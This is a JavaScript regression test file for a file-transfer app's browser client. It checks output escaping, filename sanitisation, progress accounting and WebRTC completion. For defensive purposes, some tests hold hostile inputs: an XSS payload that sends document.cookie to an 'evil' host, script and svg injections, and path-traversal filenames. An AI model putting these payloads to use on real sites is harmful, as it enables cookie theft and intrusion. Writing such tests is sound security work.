// Regression tests for the browser client.
//
// Run with:  node tests/web/test_app.js
//
// These cover the client-side logic that has no Python equivalent: escaping of
// peer-supplied values, filename sanitisation before download, and the byte
// accounting used for progress. They deliberately avoid a DOM implementation
// dependency by exercising the pure helpers with a minimal fake DOM.

const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const vm = require("node:vm");

const APP_JS = path.join(__dirname, "..", "..", "src", "seltransfer", "web", "static", "app.js");
const source = fs.readFileSync(APP_JS, "utf8");

// --- minimal DOM -----------------------------------------------------------

class FakeNode {
    constructor(tag) {
        this.tagName = String(tag || "").toUpperCase();
        this.children = [];
        this.attributes = {};
        this.classList = new Set();
        this.hidden = false;
        this.disabled = false;
        this.type = "";
        this._className = "";
        this._text = "";
        this.listeners = {};
    }
    set className(value) { this._className = String(value); this.classList = new Set(this._className.split(/\s+/).filter(Boolean)); }
    get className() { return this._className; }
    set textContent(value) { this._text = value == null ? "" : String(value); this.children = []; }
    get textContent() {
        if (this.children.length) return this.children.map((child) => child.textContent).join("");
        return this._text;
    }
    append(...nodes) { nodes.forEach((node) => this.children.push(typeof node === "string" ? textNode(node) : node)); }
    replaceChildren(...nodes) { this.children = []; this.append(...nodes); }
    addEventListener(type, handler) { (this.listeners[type] ||= []).push(handler); }
    dispatch(type, event) { (this.listeners[type] || []).forEach((handler) => handler(event || {})); }
    setAttribute(name, value) { this.attributes[name] = String(value); }
    querySelectorAll(selector) { return this.descendants().filter((node) => matches(node, selector)); }
    descendants() { return this.children.flatMap((child) => (child.descendants ? [child, ...child.descendants()] : [])); }
    get innerHTML() { throw new Error("innerHTML must not be used for peer-supplied values"); }
    set innerHTML(_value) { throw new Error("innerHTML must not be used for peer-supplied values"); }
}

function textNode(value) {
    const node = new FakeNode("#text");
    node.textContent = value;
    return node;
}

function matches(node, selector) {
    return selector.startsWith(".") ? node.classList.has(selector.slice(1)) : node.tagName === selector.toUpperCase();
}

const document = {
    createElement: (tag) => new FakeNode(tag),
    createTextNode: (value) => textNode(value),
    getElementById: () => new FakeNode("div"),
    addEventListener: () => {},
};

// app.js reads Date.now() for its timeout deadlines. A clock the test can move
// lets the timeout be exercised without waiting it out.
let clockOffset = 0;
class TestDate extends Date {
    static now() { return Date.now() + clockOffset; }
}

const sandbox = {
    document,
    window: {},
    localStorage: { getItem: () => null, setItem: () => {}, removeItem: () => {} },
    navigator: { userAgent: "node-test", platform: "node" },
    crypto: { getRandomValues: (bytes) => bytes.fill(1) },
    console,
    setTimeout, clearTimeout, setInterval, clearInterval,
    Date: TestDate,
    AbortController, fetch: async () => { throw new Error("no network in tests"); },
};
sandbox.globalThis = sandbox;
vm.createContext(sandbox);
vm.runInContext(source, sandbox, { filename: "app.js" });

// `class` declarations are lexical bindings, not sandbox properties, so read them
// back out of the same context rather than off the global object.
const TransferProgress = vm.runInContext("TransferProgress", sandbox);

// Class methods live on the prototype, so grab one off the shared prototype
// rather than instantiating the app, which would want a real DOM.
function extractMethod(name) {
    const AppClass = vm.runInContext("SeltransferApp", sandbox);
    return AppClass.prototype[name];
}

const results = [];
const pending = [];
function test(name, fn) {
    try {
        const outcome = fn();
        // Async tests report themselves when they settle.
        if (outcome && typeof outcome.then === "function") {
            pending.push(outcome.then(
                () => results.push({ name, ok: true }),
                (error) => results.push({ name, ok: false, error })
            ));
            return;
        }
        results.push({ name, ok: true });
    }
    catch (error) { results.push({ name, ok: false, error }); }
}

// --- tests -----------------------------------------------------------------

test("buildDeviceDetails never touches innerHTML", () => {
    const panel = sandbox.buildDeviceDetails({ device_id: "abc-123", transport: ["http"], ip: "10.0.0.1" });
    assert.equal(panel.className, "device-details");
    assert.ok(panel.textContent.includes("abc-123"));
    assert.ok(panel.textContent.includes("10.0.0.1"));
    // The FakeNode innerHTML setter throws, so constructing proves the helper
    // builds nodes rather than markup.
});

test("peer-supplied device_id is rendered as text, not markup", () => {
    const hostile = '<img src=x onerror="fetch(\'//evil/\'+document.cookie)">';
    const panel = sandbox.buildDeviceDetails({ device_id: hostile, ip: "10.0.0.1" });
    assert.equal(panel.querySelectorAll("IMG").length, 0, "no element may be created from device_id");
    assert.ok(panel.textContent.includes(hostile), "the raw value must survive as literal text");
});

test("hostile ip and transport values cannot inject elements", () => {
    const panel = sandbox.buildDeviceDetails({
        device_id: "safe-id",
        ip: "<script>alert(1)</script>",
        transport: ["<svg onload=alert(1)>"],
    });
    assert.equal(panel.querySelectorAll("SCRIPT").length, 0);
    assert.equal(panel.querySelectorAll("SVG").length, 0);
});

test("missing fields degrade to placeholders rather than undefined", () => {
    const panel = sandbox.buildDeviceDetails({});
    const text = panel.textContent;
    assert.ok(!text.includes("undefined"), text);
    assert.ok(text.includes("unknown"));
});

test("downloadFileName strips any directory component", () => {
    assert.equal(sandbox.downloadFileName("folder/sub/report.pdf"), "report.pdf");
    assert.equal(sandbox.downloadFileName("..\\..\\windows\\system32\\evil.dll"), "evil.dll");
    assert.equal(sandbox.downloadFileName("C:/absolute/path/file.txt"), "file.txt");
    assert.equal(sandbox.downloadFileName("plain.txt"), "plain.txt");
});

test("downloadFileName refuses empty and traversal-only names", () => {
    for (const bad of ["", "   ", "..", ".", "/", "\\", "../.."]) {
        assert.throws(() => sandbox.downloadFileName(bad), /filename/i, `expected rejection for ${JSON.stringify(bad)}`);
    }
});

test("safeRelativeName mirrors the server's path sanitisation", () => {
    assert.equal(sandbox.safeRelativeName("folder/report.pdf"), "folder/report.pdf");
    assert.equal(sandbox.safeRelativeName('a<b>c:d"e|f?g*h.txt'), "a_b_c_d_e_f_g_h.txt");
    assert.throws(() => sandbox.safeRelativeName("../escape.txt"));
    assert.throws(() => sandbox.safeRelativeName("/absolute.txt"));
    assert.throws(() => sandbox.safeRelativeName("C:/windows.txt"));
    assert.throws(() => sandbox.safeRelativeName("a//b.txt"));
});

test("TransferProgress never reports more than the declared total", () => {
    const progress = new TransferProgress(10);
    progress.add(4); progress.add(4);
    assert.equal(progress.bytes, 8);
    assert.equal(progress.percent(10), 80);
    progress.add(9); // a retried or oversized chunk must be clamped, not trusted
    assert.equal(progress.bytes, 10);
    assert.equal(progress.percent(10), 100);
});

test("TransferProgress treats a zero-byte transfer as complete", () => {
    const progress = new TransferProgress(0);
    assert.equal(progress.percent(0), 100);
});

test("TransferProgress can be rolled back after a failed file", () => {
    const progress = new TransferProgress(10);
    progress.add(6);
    progress.rollback(6);
    assert.equal(progress.bytes, 0);
    assert.equal(progress.percent(10), 0);
});

// --- WebRTC completion gate --------------------------------------------------
// The peer used to be closed as soon as every file-*start* had arrived, which
// tore the data channel down before the bytes of a large file were delivered.

test("the WebRTC wait ignores files that have only started", async () => {
    const waitForWebRTCFiles = extractMethod("waitForWebRTCFiles");
    const completed = new Set([0]);
    const settled = { value: undefined };
    const promise = waitForWebRTCFiles.call(
        { waitForWebRTCFiles },
        completed, 2
    ).then(() => { settled.value = "resolved"; });

    // Started but not finished is not enough for a two-file transfer.
    await new Promise((resolve) => setTimeout(resolve, 300));
    assert.equal(settled.value, undefined);

    completed.add(1);
    await promise;
    assert.equal(settled.value, "resolved");
});

test("the WebRTC wait rejects rather than hanging past its deadline", async () => {
    const waitForWebRTCFiles = extractMethod("waitForWebRTCFiles");
    const promise = waitForWebRTCFiles.call(
        { waitForWebRTCFiles }, new Set(), 1
    );
    // One 200ms poll, then the deadline is behind us.
    await new Promise((resolve) => setTimeout(resolve, 250));
    clockOffset += 130_000;
    try {
        const outcome = await Promise.race([
            promise.then(() => "resolved", (error) => error.message),
            new Promise((resolve) => setTimeout(
                () => resolve("still-pending"), 500)),
        ]);
        assert.equal(outcome, "WebRTC transfer timed out.");
    } finally {
        clockOffset = 0;
    }
});

// --- report ----------------------------------------------------------------

Promise.all(pending).then(() => {
    let failed = 0;
    // Async results land after the synchronous ones, so sort for stable output.
    for (const result of results) {
        if (result.ok) {
            console.log(`ok   ${result.name}`);
        } else {
            failed += 1;
            console.log(`FAIL ${result.name}\n     ${result.error.message}`);
        }
    }
    console.log(`\n${results.length - failed} passed, ${failed} failed`);
    process.exit(failed === 0 ? 0 : 1);
});
